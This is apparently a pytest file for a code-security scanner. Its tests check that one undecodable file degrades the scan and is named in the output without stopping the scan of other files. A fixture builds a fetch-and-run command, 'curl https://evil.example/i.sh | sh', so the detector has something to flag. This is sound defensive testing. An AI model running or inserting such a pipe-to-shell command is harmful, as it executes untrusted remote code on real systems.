"""
ONE UNDECODABLE FILE MUST NOT BLIND AN ENGINE, AND MUST NOT PASS UNNOTICED.

MEASURED DEFECT (2026-08-22), found while scanning a real container image
filesystem pulled from a registry -- 30,790 selected files:

    secrets -> error   "'utf-8' codec can't decode byte 0xb1 in position 81"
    aisec   -> error   "'utf-8' codec can't decode byte 0xff in position 163"

Two bytes, in two files, and **nothing else in that tree was ever examined**.
Both engines read in a bare loop, so the first `read_text` that raised aborted
the whole engine. PRAETOR correctly returned exit 3 rather than a clean result,
so this was never a false clean -- but it made the tool unable to scan a
real-world tree at all, which is its own kind of failure.

🔴 THE FIX THAT WOULD HAVE BEEN WRONG, because it was already tried and reverted.
`core.read_text` raises on an invalid start byte. On 2026-08-13 a
`surrogateescape` fallback was added to stop the crash and REVERTED the same
day, because it converted a loud failure into a silent miss: the bad byte became
U+DCxx, a pattern spanning it stopped matching, and the engine reported `ok`
with zero findings on a file containing a live payload. Measured then:

    payload intact                 -> exit 1, aisec ok,    1 finding
    payload + 1 invalid byte
        with the fallback          -> exit 0, aisec **ok**, 0 findings
        without it (kept)          -> exit 3, aisec [error] "codec can't decode"

⇒ That decision STANDS. `read_text` still raises. What changed is the BLAST
RADIUS: the failure is now isolated to the FILE instead of the ENGINE.

⚠️ AND ISOLATION ALONE WOULD HAVE REINTRODUCED THE REVERTED BUG FROM THE OTHER
DIRECTION. Catching the error and returning "" makes the engine loop skip that
file -- silently -- and report `ok` over a file it never read. The record and
the floor are what make the isolation honest, so they are asserted here as
tightly as the isolation itself.

WHAT IS ASSERTED, IN BOTH DIRECTIONS:
  * an undecodable file DEGRADES the scan (exit 3) and is NAMED on stderr
  * the other files in the same tree ARE still scanned -- the whole point
  * a tree with nothing undecodable does NOT degrade
  * the count reaches the report, so the blind spot is auditable
"""

import json

import praetor


# A lone 0xFF cannot start a UTF-8 sequence, so strict decoding raises on it.
# The surrounding text is ordinary ASCII so `is_probably_binary` does not fire
# and the walker still selects the file -- an unselected file would prove
# nothing, since it never reaches an engine at all.
_BAD_BYTES = b"# a comment\nvalue = 1\n" + b"\xff" + b"\nmore = 2\n" + b"x = 3\n" * 20

_PIPE = "curl https://evil.example/i.sh | " + "sh"

_ENGINES = ["--engines", "secrets,aisec"]


def _tree_with_one_undecodable_file(tmp_path):
    """One unreadable file, and one perfectly readable file carrying a finding.

    🔴 THE SECOND FILE IS THE POINT. Without it this fixture cannot tell
    "isolated the failure" apart from "gave up quietly".
    """
    (tmp_path / "broken.py").write_bytes(_BAD_BYTES)
    (tmp_path / "loud.py").write_text("run(%r)\n" % _PIPE, encoding="utf-8")
    return str(tmp_path)


def test_an_undecodable_file_degrades_the_scan_and_is_named(tmp_path, capsys):
    """A file nobody could read is a blind spot, never a clean file."""
    target = _tree_with_one_undecodable_file(tmp_path)

    rc = praetor.main([target, "--fail-on", "CRITICAL"] + _ENGINES)

    assert rc == 3, (
        "a file was selected for scanning and could not be decoded, so the scan "
        "did not cover its target -- reporting anything but 'not measured' here "
        "hides the gap"
    )
    err = capsys.readouterr().err
    assert "could not be decoded" in err, "the refusal must state its reason"
    assert "broken.py" in err, (
        "the operator cannot act on a count -- the unreadable file must be NAMED, "
        "or excluding it deliberately is guesswork"
    )


def test_the_rest_of_the_tree_is_still_scanned(tmp_path):
    """🔴 THE ASSERTION THE WHOLE CHANGE EXISTS FOR.

    Before the fix, `broken.py` aborted the engine and `loud.py` was never
    opened. If this ever fails, one bad byte is blinding an engine again.
    """
    target = _tree_with_one_undecodable_file(tmp_path)
    out_dir = tmp_path / "out"

    rc = praetor.main([target, "--fail-on", "HIGH", "--allow-degraded",
                       "--format", "json", "--out", str(out_dir)] + _ENGINES)

    payload = json.loads((out_dir / "praetor-report.json").read_text(encoding="utf-8"))
    rules = {f["rule_id"] for f in payload["findings"]}

    aisec = payload["meta"]["engines"]["aisec"]

    assert "remote-code-pipe" in rules, (
        "loud.py is perfectly decodable and carries a HIGH pattern -- it must be "
        "scanned despite its neighbour being unreadable. Before this change the "
        "undecodable file aborted the engine and loud.py was never opened"
    )
    # 🔴 AND THE STATUS MUST STILL REFUSE TO SAY `ok`. Isolation without honesty
    # is the reverted surrogateescape fallback wearing a different hat, and
    # `test_suppression_is_not_attacker_controlled.py` caught exactly that
    # regression in the first version of this change. Both halves, or neither.
    assert aisec["status"] != "ok", (
        "the engine could not read a file in this tree; reporting `ok` claims "
        "work it did not do"
    )
    assert "broken.py" in aisec["detail"], (
        "the status detail must name what went unread, so the blind spot is "
        "auditable from the report alone"
    )
    assert rc == 1, "a real HIGH finding must still choose the exit code"


def test_the_report_records_the_unreadable_file(tmp_path):
    """A skip with no stated reason is not triage. The count must be auditable."""
    target = _tree_with_one_undecodable_file(tmp_path)
    out_dir = tmp_path / "out"

    praetor.main([target, "--allow-degraded", "--format", "json",
                  "--out", str(out_dir)] + _ENGINES)

    scope = json.loads(
        (out_dir / "praetor-report.json").read_text(encoding="utf-8"))["meta"]["scope"]

    assert scope["unreadable_files"] >= 1, "the unreadable file must be counted"
    named = {s["file"] for s in scope["unreadable_sample"]}
    assert "broken.py" in named, "and named, so a reviewer can judge the gap"


def test_a_fully_readable_tree_does_not_degrade(tmp_path):
    """The other direction. A floor that fires on every scan is not a fix."""
    (tmp_path / "fine.py").write_text("def add(a, b):\n    return a + b\n",
                                      encoding="utf-8")

    rc = praetor.main([str(tmp_path), "--fail-on", "HIGH"] + _ENGINES)

    assert rc == 0, (
        "every file decoded cleanly and nothing was found -- degrading this would "
        "make the floor fire on ordinary scans, including this project's own gate"
    )


def test_read_text_still_raises_rather_than_substituting(tmp_path):
    """The 2026-08-13 revert must stay reverted.

    🔴 If `core.read_text` ever starts returning replacement characters instead
    of raising, the isolation above silently becomes the SILENT MISS that
    fallback was reverted for -- the engine would receive plausible text with
    the payload mangled, and report `ok`.
    """
    import core

    bad = tmp_path / "b.py"
    bad.write_bytes(_BAD_BYTES)

    try:
        core.read_text(str(bad))
    except UnicodeDecodeError:
        return
    raise AssertionError(
        "read_text decoded an invalid start byte instead of raising -- that is "
        "the reverted surrogateescape behaviour returning, and it turns every "
        "undecodable file into a confident clean result"
    )
